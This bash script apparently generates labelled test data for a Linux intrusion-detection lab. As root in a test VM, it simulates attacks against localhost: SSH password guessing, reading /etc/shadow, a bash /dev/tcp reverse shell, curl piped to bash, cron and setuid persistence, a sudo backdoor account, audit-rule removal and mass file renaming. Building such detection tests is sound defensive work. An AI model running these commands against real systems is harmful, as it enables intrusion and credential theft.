#!/usr/bin/env bash
set -uo pipefail

OUTPUT_DIR="${1:-./lab-capture}"
TEST_USER="${LINUXGUARD_TEST_USER:-lgtest}"
TEST_PASSWORD="${LINUXGUARD_TEST_PASSWORD:-}"
CASES=()

if [[ "${EUID}" -ne 0 ]]; then
    echo "run_scenarios.sh must be run as root inside an isolated test VM" >&2
    exit 1
fi

now() {
    date +%s.%N
}

record_case() {
    local name="$1" malicious="$2" covered="$3" start="$4" end="$5" description="$6"
    CASES+=("{\"case_id\": \"${name}-$((${#CASES[@]} + 1))\", \"scenario\": \"${name}\", \"malicious\": ${malicious}, \"start\": ${start}, \"end\": ${end}, \"selectors\": {}, \"covered_by_rules\": ${covered}, \"description\": \"${description}\"}")
}

run_case() {
    local name="$1" malicious="$2" covered="$3" description="$4"
    shift 4
    local start end
    start="$(now)"
    "$@" >/dev/null 2>&1
    end="$(now)"
    record_case "${name}" "${malicious}" "${covered}" "${start}" "${end}" "${description}"
    echo "  ${name}: done"
    sleep 20
}

as_test_user() {
    sudo -u "${TEST_USER}" -H bash -c "$1"
}

benign_admin() {
    uptime; df -h; free -m; cat /etc/hosts; ls -la /etc/nginx 2>/dev/null; systemctl status ssh --no-pager
}

benign_developer() {
    as_test_user 'cd ~ && ls -la && mkdir -p work && echo "print(1)" > work/app.py && python3 work/app.py && grep -rn print work'
}

ssh_brute_force() {
    for _ in $(seq 1 8); do
        sshpass -p "wrong-password" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no -o ConnectTimeout=3 "${TEST_USER}@127.0.0.1" true
    done
}

brute_force_success() {
    ssh_brute_force
    if [[ -n "${TEST_PASSWORD}" ]]; then
        sshpass -p "${TEST_PASSWORD}" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no "${TEST_USER}@127.0.0.1" "whoami; id"
    fi
}

credential_access() {
    cat /etc/shadow
}

temporary_execution() {
    cp /bin/true /tmp/lg-test-binary && chmod +x /tmp/lg-test-binary && /tmp/lg-test-binary
    rm -f /tmp/lg-test-binary
}

reverse_shell_pattern() {
    (timeout 3 nc -l 127.0.0.1 4444 >/dev/null 2>&1 &)
    sleep 0.5
    timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
}

download_and_execute() {
    sh -c 'curl -fsS --max-time 2 http://127.0.0.1:9/install.sh | bash'
}

cron_persistence() {
    echo "# linuxguard test entry" | tee /etc/cron.d/linuxguard-test
    rm -f /etc/cron.d/linuxguard-test
}

setuid_backdoor() {
    cp /bin/true /tmp/lg-suid && chmod u+s /tmp/lg-suid
    rm -f /tmp/lg-suid
}

account_creation() {
    useradd -M lgtemp && usermod -aG sudo lgtemp
    userdel lgtemp
}

discovery_burst() {
    whoami; id; uname -a; hostname; ip a; ss -tunap; ps aux; w; last
}

kernel_module() {
    modprobe dummy && modprobe -r dummy
}

audit_tampering() {
    auditctl -w /tmp/lg-watch -k lg_temporary && auditctl -W /tmp/lg-watch -k lg_temporary
}

internal_scan() {
    python3 -c 'import socket
for host in range(1, 80):
    s = socket.socket(); s.settimeout(0.05); s.connect_ex(("127.0.0.%d" % host, 22)); s.close()'
}

mass_rename() {
    as_test_user 'mkdir -p ~/lg-documents && for i in $(seq 1 200); do echo data > ~/lg-documents/file_$i.docx; done'
    as_test_user 'cd ~/lg-documents && for f in *.docx; do mv "$f" "$f.locked"; done'
    as_test_user 'rm -rf ~/lg-documents'
}

id "${TEST_USER}" >/dev/null 2>&1 || useradd -m -s /bin/bash "${TEST_USER}"
if [[ -n "${TEST_PASSWORD}" ]]; then
    echo "${TEST_USER}:${TEST_PASSWORD}" | chpasswd
fi

echo "Running LinuxGuard lab scenarios (authorised test actions only)"
run_case benign_admin false null "Routine administrator commands" benign_admin
run_case benign_developer false null "Routine developer commands" benign_developer
run_case ssh_brute_force true true "SSH password guessing against localhost" ssh_brute_force
run_case brute_force_success true true "Password guessing followed by login" brute_force_success
run_case credential_file_access true true "Reading /etc/shadow" credential_access
run_case temporary_directory_execution true true "Executing a binary from /tmp" temporary_execution
run_case reverse_shell true true "Bash /dev/tcp reverse shell to localhost" reverse_shell_pattern
run_case download_and_execute true true "curl piped to bash" download_and_execute
run_case cron_persistence true true "Creating a cron.d entry" cron_persistence
run_case setuid_backdoor true true "Setting the setuid bit" setuid_backdoor
run_case backdoor_account true true "Creating an account in the sudo group" account_creation
run_case discovery_burst true true "Burst of discovery commands" discovery_burst
run_case kernel_module_load true true "Loading the dummy kernel module" kernel_module
run_case audit_tampering true true "Removing an audit rule" audit_tampering
run_case internal_network_scan true false "Connecting to many local addresses" internal_scan
run_case mass_file_encryption true false "Renaming many files in a home directory" mass_rename

mkdir -p "${OUTPUT_DIR}"
cp /var/log/audit/audit.log "${OUTPUT_DIR}/audit.log"
cp /var/log/auth.log "${OUTPUT_DIR}/auth.log"
cp /etc/passwd "${OUTPUT_DIR}/passwd"
(IFS=,; echo "[${CASES[*]}]") > "${OUTPUT_DIR}/labels.json"
chmod -R go-rwx "${OUTPUT_DIR}"
echo "Capture written to ${OUTPUT_DIR}"
